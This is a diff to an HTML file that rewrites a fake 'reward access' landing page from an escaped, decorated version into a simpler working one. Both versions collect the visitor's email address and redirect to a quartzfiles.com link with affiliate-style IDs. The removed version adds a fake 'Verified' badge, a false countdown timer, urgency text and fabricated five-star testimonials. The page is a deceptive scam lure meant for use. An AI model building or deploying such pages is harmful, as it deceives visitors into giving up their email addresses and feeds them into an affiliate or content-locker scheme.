@@ -1,1 +1,56 @@
-<p>&lt;!DOCTYPE html&gt;<br>&lt;html lang="en"&gt;<br>&lt;head&gt;<br>&lt;meta charset="UTF-8"&gt;<br>&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;<br>&lt;title&gt;Secure Access Portal&lt;/title&gt;</p><p>&lt;style&gt;<br>body {<br>&nbsp;margin: 0;<br>&nbsp;font-family: 'Inter', sans-serif;<br>&nbsp;background: linear-gradient(135deg, #020617, #0f172a);<br>&nbsp;color: #fff;<br>}</p><p>.container {<br>&nbsp;max-width: 420px;<br>&nbsp;margin: 50px auto;<br>&nbsp;padding: 25px;<br>&nbsp;background: rgba(255,255,255,0.04);<br>&nbsp;border-radius: 18px;<br>&nbsp;box-shadow: 0 20px 60px rgba(0,0,0,0.6);<br>&nbsp;backdrop-filter: blur(12px);<br>&nbsp;text-align: center;<br>}</p><p>.banner {<br>&nbsp;width: 100%;<br>&nbsp;border-radius: 12px;<br>&nbsp;margin-bottom: 15px;<br>}</p><p>.badge {<br>&nbsp;display: inline-block;<br>&nbsp;background: #22c55e;<br>&nbsp;padding: 6px 14px;<br>&nbsp;border-radius: 20px;<br>&nbsp;font-size: 12px;<br>&nbsp;margin-bottom: 10px;<br>}</p><p>h1 {<br>&nbsp;font-size: 22px;<br>&nbsp;margin-bottom: 10px;<br>}</p><p>p {<br>&nbsp;font-size: 14px;<br>&nbsp;color: #cbd5f5;<br>}</p><p>.timer {<br>&nbsp;font-size: 18px;<br>&nbsp;color: #f87171;<br>&nbsp;margin: 12px 0;<br>&nbsp;font-weight: bold;<br>}</p><p>.urgency {<br>&nbsp;font-size: 13px;<br>&nbsp;color: #facc15;<br>&nbsp;margin-bottom: 10px;<br>}</p><p>/* 🔥 CENTERED INPUT */<br>input {<br>&nbsp;width: 85%;<br>&nbsp;padding: 13px;<br>&nbsp;border-radius: 10px;<br>&nbsp;border: none;<br>&nbsp;margin: 15px auto 0 auto;<br>&nbsp;display: block;<br>&nbsp;font-size: 14px;<br>}</p><p>/* 🔥 CENTERED BUTTONS */<br>button {<br>&nbsp;width: 85%;<br>&nbsp;padding: 14px;<br>&nbsp;margin: 10px auto 0 auto;<br>&nbsp;display: block;<br>&nbsp;border-radius: 10px;<br>&nbsp;border: none;<br>&nbsp;font-size: 15px;<br>&nbsp;font-weight: 600;<br>&nbsp;cursor: pointer;<br>&nbsp;background: linear-gradient(135deg, #22c55e, #16a34a);<br>&nbsp;color: #fff;<br>&nbsp;transition: 0.3s;<br>}</p><p>button:hover {<br>&nbsp;transform: scale(1.03);<br>&nbsp;opacity: 0.95;<br>}</p><p>.loader {<br>&nbsp;display: none;<br>&nbsp;margin-top: 10px;<br>&nbsp;font-size: 13px;<br>}</p><p>.reviews {<br>&nbsp;margin-top: 20px;<br>&nbsp;text-align: left;<br>}</p><p>.review {<br>&nbsp;display: flex;<br>&nbsp;gap: 10px;<br>&nbsp;margin-bottom: 12px;<br>&nbsp;background: rgba(255,255,255,0.05);<br>&nbsp;padding: 10px;<br>&nbsp;border-radius: 10px;<br>}</p><p>.review img {<br>&nbsp;width: 42px;<br>&nbsp;height: 42px;<br>&nbsp;border-radius: 50%;<br>}</p><p>.review-text {<br>&nbsp;font-size: 13px;<br>&nbsp;color: #e2e8f0;<br>}</p><p>.stars {<br>&nbsp;color: #fbbf24;<br>&nbsp;font-size: 12px;<br>}</p><p>.footer {<br>&nbsp;margin-top: 15px;<br>&nbsp;font-size: 11px;<br>&nbsp;color: #94a3b8;<br>}<br>&lt;/style&gt;<br>&lt;/head&gt;</p><p>&lt;body&gt;</p><p>&lt;div class="container"&gt;</p><p>&nbsp;&lt;img class="banner" src="https://images.unsplash.com/photo-1519389950473-47ba0277781c?q=80&amp;w=800" alt="Secure Access"&gt;</p><p>&nbsp;&lt;div class="badge"&gt;✔ Verified Access Portal&lt;/div&gt;</p><p>&nbsp;&lt;h1&gt;Claim Your Exclusive Reward Access&lt;/h1&gt;<br>&nbsp;&lt;p&gt;Complete a quick check to see if you qualify for available offers.&lt;/p&gt;</p><p>&nbsp;&lt;div class="timer" id="timer"&gt;02:00&lt;/div&gt;<br>&nbsp;&lt;div class="urgency"&gt;⚡ Limited access — spots filling fast&lt;/div&gt;</p><p>&nbsp;&lt;input type="email" id="email" placeholder="Enter your email"&gt;</p><p>&nbsp;&lt;button onclick="goOffer()"&gt;Check Eligibility&lt;/button&gt;<br>&nbsp;&lt;button onclick="goOffer()"&gt;Proceed Securely&lt;/button&gt;</p><p>&nbsp;&lt;div class="loader" id="loader"&gt;🔒 Connecting securely...&lt;/div&gt;</p><p>&nbsp;&lt;div class="reviews"&gt;</p><p>&nbsp; &nbsp;&lt;div class="review"&gt;<br>&nbsp; &nbsp; &nbsp;&lt;img src="https://i.pravatar.cc/50?img=11"&gt;<br>&nbsp; &nbsp; &nbsp;&lt;div class="review-text"&gt;<br>&nbsp; &nbsp; &nbsp; &nbsp;&lt;div class="stars"&gt;★★★★★&lt;/div&gt;<br>&nbsp; &nbsp; &nbsp; &nbsp;"Got access within minutes. The process was really quick and simple."<br>&nbsp; &nbsp; &nbsp;&lt;/div&gt;<br>&nbsp; &nbsp;&lt;/div&gt;</p><p>&nbsp; &nbsp;&lt;div class="review"&gt;<br>&nbsp; &nbsp; &nbsp;&lt;img src="https://i.pravatar.cc/50?img=22"&gt;<br>&nbsp; &nbsp; &nbsp;&lt;div class="review-text"&gt;<br>&nbsp; &nbsp; &nbsp; &nbsp;&lt;div class="stars"&gt;★★★★★&lt;/div&gt;<br>&nbsp; &nbsp; &nbsp; &nbsp;"Everything worked smoothly. Received my reward without any issues."<br>&nbsp; &nbsp; &nbsp;&lt;/div&gt;<br>&nbsp; &nbsp;&lt;/div&gt;</p><p>&nbsp; &nbsp;&lt;div class="review"&gt;<br>&nbsp; &nbsp; &nbsp;&lt;img src="https://i.pravatar.cc/50?img=33"&gt;<br>&nbsp; &nbsp; &nbsp;&lt;div class="review-text"&gt;<br>&nbsp; &nbsp; &nbsp; &nbsp;&lt;div class="stars"&gt;★★★★★&lt;/div&gt;<br>&nbsp; &nbsp; &nbsp; &nbsp;"Fast verification and easy steps. Definitely worth trying."<br>&nbsp; &nbsp; &nbsp;&lt;/div&gt;<br>&nbsp; &nbsp;&lt;/div&gt;</p><p>&nbsp;&lt;/div&gt;</p><p>&nbsp;&lt;div class="footer"&gt;<br>&nbsp; &nbsp;*Availability may vary by region. Additional verification steps may be required.<br>&nbsp;&lt;/div&gt;</p><p>&lt;/div&gt;</p><p>&lt;script&gt;<br>let time = 120;<br>let timerEl = document.getElementById("timer");</p><p>setInterval(() =&gt; {<br>&nbsp;let m = Math.floor(time / 60);<br>&nbsp;let s = time % 60;<br>&nbsp;timerEl.innerHTML = `${m}:${s &lt; 10 ? '0'+s : s}`;<br>&nbsp;if(time &gt; 0) time--;<br>}, 1000);</p><p>function goOffer() {<br>&nbsp;let email = document.getElementById("email").value;</p><p>&nbsp;if(email === "") {<br>&nbsp; &nbsp;alert("Please enter your email");<br>&nbsp; &nbsp;return;<br>&nbsp;}</p><p>&nbsp;document.getElementById("loader").style.display = "block";</p><p>&nbsp;setTimeout(() =&gt; {<br>&nbsp; &nbsp;window.location.href = "https://quartzfiles.com/show.php?l=0&amp;u=2509019&amp;id=74375";<br>&nbsp;}, 1200);<br>}<br>&lt;/script&gt;</p><p>&lt;/body&gt;<br>&lt;/html&gt;</p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Access Portal</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: 'Inter', sans-serif;
+  background: linear-gradient(135deg, #020617, #0f172a);
+  color: #fff;
+}
+.container {
+  max-width: 420px;
+  margin: 50px auto;
+  padding: 25px;
+  background: rgba(255,255,255,0.04);
+  border-radius: 18px;
+  text-align: center;
+}
+button {
+  width: 85%;
+  padding: 14px;
+  margin-top: 10px;
+  border-radius: 10px;
+  border: none;
+  font-size: 15px;
+  background: #22c55e;
+  color: #fff;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <h1>Claim Your Reward</h1>
+  <input type="email" id="email" placeholder="Enter your email">
+  <button onclick="goOffer()">Continue</button>
+</div>
+
+<script>
+function goOffer() {
+  let email = document.getElementById("email").value;
+  if(email === "") {
+    alert("Enter email");
+    return;
+  }
+  window.location.href = "https://quartzfiles.com/show.php?l=0&u=2509019&id=74375";
+}
+</script>
+
+</body>
+</html>
